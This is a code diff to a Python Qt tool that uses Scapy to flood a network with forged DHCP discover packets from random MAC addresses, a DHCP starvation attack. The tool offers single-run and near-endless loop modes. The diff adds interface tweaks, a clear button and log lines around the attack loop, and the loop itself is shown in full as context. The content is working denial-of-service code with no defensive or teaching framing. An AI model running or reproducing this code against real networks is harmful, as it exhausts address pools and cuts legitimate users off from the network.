@@ -21,9 +21,13 @@ class Win_Main:
         self.ui.Attack_start.clicked.connect(lambda:self.Check_Data(False))
         self.ui.Loop_Attack.clicked.connect(lambda:self.Check_Data(True))
         self.ui.STOP.clicked.connect(self.STOP_MODE)
-
+        self.ui.Clean.clicked.connect(self.Clear_winow_Attack)
         self.ui.Delay.setText("1000")
         self.ui.Lock.setText(self.NetWork_INFO[0][0])
+
+
+    def Clear_winow_Attack(self):
+        self.ui.Attack_View.clear()
     def STOP_MODE(self):
         self.LOOP_STOP_MODE=True
         self.Error("Stop Success!!")
@@ -67,23 +71,26 @@ class Win_Main:
         if MODE :
             self.Attack_Number=99999
 
-
+        self.ui.Attack_View.append(f"---{datetime.datetime.now()}----\nUse {self.iterface_Lock} Attacking... Number-->{self.Attack_Number}  ..Time{self.Attack_Time*self.Attack_Number}s..")
         for i in range(0, int(self.Attack_Number)):
             if self.LOOP_STOP_MODE==False:
+
                 xid_random = random.randint(1, 90000000)
                 mac_random = str(RandMAC())
                 clien_mac_id = binascii.unhexlify(mac_random.replace(":", ''))
-                self.ui.Attack_View.append(f"{mac_random} From {self.iterface_Lock} Attacking...")
+                #self.ui.Attack_View.append(f"{mac_random} From {self.iterface_Lock} Attacking...")
                 dhcp_discover = Ether(src=mac_random, dst="FF:FF:FF:FF:FF:FF") / IP(src="0.0.0.0",dst="255.255.255.255") / \
                     UDP(sport=68,dport=67) / BOOTP(chaddr=clien_mac_id, xid=xid_random) / DHCP(options=[("message-type", "discover"), "end"])
                 sendp(dhcp_discover, iface=str(self.iterface_Lock))
                 time.sleep(int(self.Attack_Time))
-                self.ui.Attack_View.append("^^^^"+str(datetime.datetime.now()))
+                #self.ui.Attack_View.append("^^^^"+str(datetime.datetime.now()))
+
             else:
                 break
-
+        self.ui.Attack_View.append(f"Use {self.iterface_Lock} Dhcp Attack------[Done]")
         self.LOOP_STOP_MODE = False
         self.LOCK = False
+
 def main():
     app = QApplication([])
     PubDATA.mainWin = Win_Main()
